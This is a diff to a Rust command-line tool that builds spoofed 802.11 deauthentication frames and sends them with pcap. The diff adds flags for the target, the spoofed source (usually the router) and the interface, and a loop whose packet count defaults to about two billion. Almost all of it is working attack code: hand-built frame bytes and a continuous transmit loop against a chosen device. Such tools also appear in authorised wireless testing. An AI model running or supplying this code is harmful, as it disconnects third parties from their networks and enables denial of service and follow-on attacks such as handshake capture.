@@ -1,6 +1,16 @@
-use std::env::args;
+/*
+ * This Script sends deauth packet to the specified target mac address
+ * Spoofs the deauth packet with sender mac address
+ * Waits for 1 seconds before sending packet so as not to overwhelm the network
+ *
+ * */
+
+/* Imports */
+use std::{ env::args, thread ,time::Duration };
+use std::collections::HashMap;
 use pcap::{ Capture, Device };
 
+/* Converts string mac address to a vector */
 fn parse_mac(mac: &String) -> Option<Vec<u8>> {
     let mac_vec: Vec<u8> = mac.split(':')
                                 .map(|x| u8::from_str_radix(x, 16).unwrap())
@@ -12,21 +22,8 @@ fn parse_mac(mac: &String) -> Option<Vec<u8>> {
     return Some(mac_vec);
 }
 
-fn main() {
-    let argv: Vec<String> = args().collect();
-    if argv.len() < 3 {
-        println!("[?] Usage: {} <source_mac> <target_mac>", argv[0]);
-    }
-    
-    let source_mac = match parse_mac(&argv[1]) {
-        Some(x) => x,
-        None => panic!("[!] Not a valid source mac address"),
-    };
-    let target_mac = match parse_mac(&argv[2]) {
-        Some(x) => x,
-        None => panic!("[!] Not a valid destination mac address"),
-    };
-
+/* Creates a Deauth Packet Frame */
+fn create_packet(target_mac: Vec<u8> , source_mac: Vec<u8>) -> Vec<u8> {
     let radiotap_headers = [
         0x00, 0x00,                 // radiotap version + 0x00 padding
         0x19, 0x00,                 // number of bytes in our header (length)
@@ -48,18 +45,107 @@ fn main() {
         0x00, 0x00,                 // sequence control
         0x07, 0x00,                 // reason code
     ];
-    
+
     let mut packet: Vec<u8> = Vec::new();
     packet.extend_from_slice(&radiotap_headers);
     packet.extend_from_slice(&mac_headers);
     
+    return packet;
+}
+
+fn print_help(prog_name: &String) {
+    println!("Usage: sudo {} [OPTIONS]", prog_name);
+    println!();
+    println!("Options:");
+    println!("  -t <target_mac>       Set the target MAC address (the one to be deauthenticated)");
+    println!("  -s <source_mac>       Set the source MAC address (usually the AP/router)");
+    println!("  -i <interface>        Set the wireless interface in monitor mode (e.g., wlan0mon)");
+    println!("  --packets  <n>        Set the number of packets to be sent (e.g., 10)");
+    println!("  --interval <seconds>  Set the delay between each deauth packet (default: 1)");
+    println!("  -h, --help            Show this help message and exit");
+}
+
+fn argparse(argv: &Vec<String>) -> Option<HashMap<&str, &String>> {
+    let mut args: HashMap<&str, &String> = HashMap::new();
+
+    let len = argv.len();
+    
+    for (i, j) in argv.iter().enumerate() {
+        if j == "-h" || j == "--help" || len == 1 {
+            print_help(&argv[0]);
+            return None;
+        }
+    
+        if i + 1 >= len {
+            break;
+        }
+
+        match j.as_str() {
+            "-t" => { _ = args.insert("-t", &argv[i + 1]); },
+            "-s" => { _ = args.insert("-s", &argv[i + 1]); },
+            "-i" => { _ = args.insert("-i", &argv[i + 1]); },
+            "--packets" => { _ = args.insert("--packets", &argv[i + 1]); },
+            "--interval" => { args.insert("--interval", &argv[i + 1]); },
+            _ => {},
+        };
+    }
+
+    return Some(args);
+}
+
+fn main() {
+    let argv: Vec<String> = args().collect();
+    
+    let hashmap = match argparse(&argv) {
+        Some(x) => x,
+        None => { return; },
+    };
+
+    let interval: u64 = match hashmap.get("--interval") {
+        Some(x) => x.parse().expect("[!] Error parsing the value"),
+        None => 1,
+    };
+
+    let source_mac: Vec<u8> = match hashmap.get("-s") {
+        Some(x) => match parse_mac(x) {
+            Some(y) => y,
+            None => panic!("[!] Not a valid mac address"),
+        },
+        None => panic!("[!] Please enter a source mac address"),
+    };
+ 
+    let target_mac: Vec<u8> = match hashmap.get("-t") {
+        Some(x) => match parse_mac(x) {
+            Some(y) => y,
+            None => panic!("[!] Not a valid mac address"),
+        },
+        None => panic!("[!] Please enter a target mac address"),
+    };           
+
+    let packet: Vec<u8> = create_packet(target_mac, source_mac);
+    
     let mut capture = Capture::from_device(Device::lookup().unwrap().unwrap())
                             .unwrap_or_else(|_| panic!("[!] This script requires root privilages"))
                             .open()
-                            .unwrap();
-    
-    match capture.sendpacket(packet) {
-        Ok(_) => {},
-        Err(err) => println!("[!] Error sending packet {} !", err),
+                            .unwrap_or_else(|_| panic!("[!] This script requires root privilages"));
+
+    let mut counter: i32 = 0;
+    let pkt_cnt: i32 = match hashmap.get("--packets") {
+        Some(x) => x.parse().expect("[!] Error parsing packet flag"),
+        None => 2147483647,
+    };
+
+    println!("[#] Deauthing {}", match hashmap.get("-t") { 
+                    Some(x) => x, 
+                    None => panic!("lol") 
+    });
+
+    while counter < pkt_cnt {
+        counter += 1;
+        match capture.sendpacket(packet.clone()) {
+            Ok(_) => println!("[#] Sent {} Deauth Packet (code 7)", counter),
+            Err(err) => println!("[!] Error sending packet {} !", err),
+        }
+        thread::sleep(Duration::from_secs(interval));
     }
 }
